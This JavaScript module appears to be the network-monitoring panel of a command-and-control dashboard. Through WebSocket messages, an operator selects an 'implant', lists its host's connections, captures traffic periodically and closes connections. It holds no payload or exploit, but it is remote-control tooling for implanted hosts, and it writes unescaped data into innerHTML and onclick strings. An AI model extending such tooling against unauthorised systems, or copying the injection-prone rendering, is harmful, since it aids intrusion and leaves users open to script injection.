// Network Monitor Module
const NetworkMonitor = {
    socket: null,
    selectedImplant: null,
    connectionList: [],
    isCapturing: false,
    captureInterval: null,

    init(socket) {
        this.socket = socket;
        console.log('NetworkMonitor initialized with socket');
        this.setupEventListeners();
    },

    setupEventListeners() {
        try {
            // Control buttons
            const refreshBtn = document.getElementById('refresh-connections');
            const startBtn = document.getElementById('start-capture');
            const stopBtn = document.getElementById('stop-capture');
            
            if (refreshBtn) {
                refreshBtn.addEventListener('click', () => this.refreshConnections());
            }
            
            if (startBtn) {
                startBtn.addEventListener('click', () => this.startCapture());
            }
            
            if (stopBtn) {
                stopBtn.addEventListener('click', () => this.stopCapture());
            }

            // Use custom event for WebSocket messages
            document.addEventListener('socket-message', (event) => {
                const message = event.detail;
                if (message.type === 'connection_list') {
                    this.handleConnectionList(message);
                } else if (message.type === 'network_capture') {
                    this.handleNetworkCapture(message);
                }
            });
            
            console.log('NetworkMonitor event listeners set up');
        } catch (error) {
            console.error('Error setting up NetworkMonitor event listeners:', error);
        }
    },

    selectImplant(implantId) {
        console.log(`NetworkMonitor: Setting selected implant to ${implantId}`);
        this.selectedImplant = implantId;
        return implantId;
    },

    refreshConnections() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        if (WebSocketManager && WebSocketManager.send) {
            WebSocketManager.send({
                type: 'get_connections',
                implant_id: this.selectedImplant
            });
            console.log(`Requested connections for implant: ${this.selectedImplant}`);
        } else {
            console.error('WebSocketManager not available');
        }
    },

    handleConnectionList(data) {
        if (!data.connections) {
            console.error('No connection data received');
            return;
        }
        
        this.connectionList = data.connections;
        this.renderConnectionList();
    },

    renderConnectionList() {
        const connectionList = document.getElementById('connections-list');
        if (!connectionList) {
            console.error('Connection list element not found');
            return;
        }
        
        connectionList.innerHTML = '';

        this.connectionList.forEach(conn => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${conn.protocol}</td>
                <td>${conn.local_address}</td>
                <td>${conn.remote_address}</td>
                <td>
                    <span class="badge ${this.getStatusBadgeClass(conn.state)}">
                        ${conn.state}
                    </span>
                </td>
                <td>${conn.pid}</td>
                <td>${conn.program}</td>
                <td>
                    <div class="btn-group">
                        <button class="btn btn-sm btn-info" onclick="NetworkMonitor.viewConnectionDetails('${conn.id}')">
                            <i class="fas fa-info-circle"></i> Details
                        </button>
                        <button class="btn btn-sm btn-danger" onclick="NetworkMonitor.closeConnection('${conn.id}')">
                            <i class="fas fa-times"></i> Close
                        </button>
                    </div>
                </td>
            `;
            connectionList.appendChild(row);
        });
    },

    getStatusBadgeClass(state) {
        switch (state.toLowerCase()) {
            case 'established':
                return 'bg-success';
            case 'listening':
                return 'bg-info';
            case 'time_wait':
                return 'bg-warning';
            case 'closed':
                return 'bg-danger';
            default:
                return 'bg-secondary';
        }
    },

    startCapture() {
        if (!this.selectedImplant) {
            dashboard.showNotification('Please select an implant first', 'warning');
            return;
        }

        if (this.isCapturing) {
            dashboard.showNotification('Network capture is already active', 'info');
            return;
        }

        this.isCapturing = true;
        
        if (WebSocketManager && WebSocketManager.send) {
            WebSocketManager.send({
                type: 'start_capture',
                implant_id: this.selectedImplant
            });
        }

        // Start periodic refresh
        this.captureInterval = setInterval(() => {
            this.refreshConnections();
        }, 5000); // Refresh every 5 seconds

        dashboard.showNotification('Network capture started', 'success');
    },

    stopCapture() {
        if (!this.isCapturing) {
            dashboard.showNotification('No active network capture', 'info');
            return;
        }

        this.isCapturing = false;
        clearInterval(this.captureInterval);
        
        if (WebSocketManager && WebSocketManager.send) {
            WebSocketManager.send({
                type: 'stop_capture',
                implant_id: this.selectedImplant
            });
        }

        dashboard.showNotification('Network capture stopped', 'info');
    },

    handleNetworkCapture(data) {
        // Update connection list with new data
        if (!data.connections) {
            console.error('No connection data received in network capture');
            return;
        }
        
        this.connectionList = data.connections;
        this.renderConnectionList();

        // Show notification for new connections
        if (data.new_connections && data.new_connections.length > 0) {
            data.new_connections.forEach(conn => {
                dashboard.showNotification(
                    `New connection: ${conn.program} (${conn.protocol})`,
                    'info'
                );
            });
        }
    },

    viewConnectionDetails(connectionId) {
        if (!this.selectedImplant) return;

        if (WebSocketManager && WebSocketManager.send) {
            WebSocketManager.send({
                type: 'get_connection_details',
                implant_id: this.selectedImplant,
                connection_id: connectionId
            });
        }
    },

    closeConnection(connectionId) {
        if (!this.selectedImplant) return;

        if (confirm('Are you sure you want to close this connection?')) {
            if (WebSocketManager && WebSocketManager.send) {
                WebSocketManager.send({
                    type: 'close_connection',
                    implant_id: this.selectedImplant,
                    connection_id: connectionId
                });
            }
        }
    },

    // Connection details modal
    showConnectionDetailsModal(details) {
        if (!details) {
            console.error('No connection details received');
            return;
        }
        
        try {
            const modal = document.createElement('div');
            modal.className = 'modal fade';
            modal.id = 'connectionDetailsModal';
            modal.innerHTML = `
                <div class="modal-dialog modal-lg">
                    <div class="modal-content">
                        <div class="modal-header">
                            <h5 class="modal-title">Connection Details</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                        </div>
                        <div class="modal-body">
                            <div class="row">
                                <div class="col-md-6">
                                    <h6>Local Endpoint</h6>
                                    <table class="table">
                                        <tr>
                                            <th>Address:</th>
                                            <td>${details.local_address}</td>
                                        </tr>
                                        <tr>
                                            <th>Port:</th>
                                            <td>${details.local_port}</td>
                                        </tr>
                                    </table>
                                </div>
                                <div class="col-md-6">
                                    <h6>Remote Endpoint</h6>
                                    <table class="table">
                                        <tr>
                                            <th>Address:</th>
                                            <td>${details.remote_address}</td>
                                        </tr>
                                        <tr>
                                            <th>Port:</th>
                                            <td>${details.remote_port}</td>
                                        </tr>
                                    </table>
                                </div>
                            </div>
                            <div class="row mt-3">
                                <div class="col-12">
                                    <h6>Connection Information</h6>
                                    <table class="table">
                                        <tr>
                                            <th>Protocol:</th>
                                            <td>${details.protocol}</td>
                                        </tr>
                                        <tr>
                                            <th>State:</th>
                                            <td>
                                                <span class="badge ${this.getStatusBadgeClass(details.state)}">
                                                    ${details.state}
                                                </span>
                                            </td>
                                        </tr>
                                        <tr>
                                            <th>PID:</th>
                                            <td>${details.pid}</td>
                                        </tr>
                                        <tr>
                                            <th>Program:</th>
                                            <td>${details.program}</td>
                                        </tr>
                                        <tr>
                                            <th>Duration:</th>
                                            <td>${details.duration}</td>
                                        </tr>
                                    </table>
                                </div>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                            <button type="button" class="btn btn-danger" onclick="NetworkMonitor.closeConnection('${details.id}')">
                                Close Connection
                            </button>
                        </div>
                    </div>
                </div>
            `;

            document.body.appendChild(modal);
            const modalInstance = new bootstrap.Modal(modal);
            modalInstance.show();

            modal.addEventListener('hidden.bs.modal', () => {
                modal.remove();
            });
        } catch (error) {
            console.error('Error displaying connection details:', error);
        }
    }
};

// Remove the duplicate initialization since WebSocketManager now handles this
document.addEventListener('DOMContentLoaded', () => {
    // WebSocketManager will initialize this module
    console.log('NetworkMonitor waiting for WebSocketManager initialization');
}); 